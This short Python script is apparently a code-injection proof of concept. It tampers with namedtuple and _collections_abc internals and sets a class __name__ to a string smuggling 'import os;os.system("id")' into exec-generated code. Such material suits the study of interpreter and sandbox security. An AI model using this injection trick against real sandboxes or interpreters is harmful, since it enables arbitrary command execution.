from collections import namedtuple, _collections_abc

namedtuple.__kwdefaults__ = {
    "rename": False,
    "defaults": ("arg1", "arg2"),
    "module": None}

T = namedtuple('T', ['a', 'b'])
namedtuple.__kwdefaults__ = {
    "rename": False,
    "defaults": None,
    "module": None}

_collections_abc.tuple = T
_collections_abc.__all__ = ["tuple"]

from collections import tuple

T.__name__ = 'xy): pass\nimport os;os.system(\"id\")#'


namedtuple('T', ['a'])
